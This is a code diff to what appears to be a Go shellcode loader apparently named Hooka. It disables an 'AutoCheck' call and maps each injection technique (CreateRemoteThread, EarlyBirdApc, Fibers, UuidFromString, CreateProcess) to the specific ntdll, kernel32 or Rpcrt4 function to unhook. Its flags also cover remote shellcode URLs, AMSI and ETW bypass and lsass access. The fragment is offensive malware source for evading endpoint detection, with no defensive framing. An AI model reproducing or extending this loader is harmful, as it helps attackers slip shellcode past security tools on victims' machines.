@@ -17,10 +17,10 @@ func main() {
   var shellcode []byte
   var err error
 
-  err = hooka.AutoCheck()
+  /*err = hooka.AutoCheck()
   if err != nil {
     l.Fatal(err)
-  }
+  }*/
 
   // Parse CLI flags and retrieve values
   sc_url, sc_file, dll_file, dll_url, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, etw, lsass, pid := hooka.ParseFlags()
@@ -499,10 +499,31 @@ func checkEtw(check bool) {
 
 func checkUnhook(unhook int, technique string) {
   // Unhook function(s)
+  var func_to_unhook string
+  var lib string
+
   if (unhook == 1) {
     l.Println("[*] Unhooking functions via Classic technique...")
     time.Sleep(200 * time.Millisecond)
-    err := hooka.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
+
+    if (technique == "CreateRemoteThread") {
+      func_to_unhook = "CreateRemoteThreadEx"
+      lib = "C:\\Windows\\System32\\ntdll.dll"
+    } else if (technique == "CreateProcess") {
+      func_to_unhook = "NtQueryInformationProcess"
+      lib = "C:\\Windows\\System32\\ntdll.dll"
+    } else if (technique == "EarlyBirdApc") {
+      func_to_unhook = "QueueUserAPC"
+      lib = "C:\\Windows\\System32\\kernel32.dll"
+    } else if (technique == "Fibers") {
+      func_to_unhook = "RtlCopyMemory"
+      lib = "C:\\Windows\\System32\\ntdll.dll"
+    } else if (technique == "UuidFromString") {
+      func_to_unhook = "UuidFromStringA"
+      lib = "C:\\Windows\\System32\\Rpcrt4.dll"
+    }
+
+    err := hooka.ClassicUnhook(func_to_unhook, lib)
     if err != nil {
       l.Println("[-] An error has ocurred while unhooking functions!")
       l.Fatal(err)
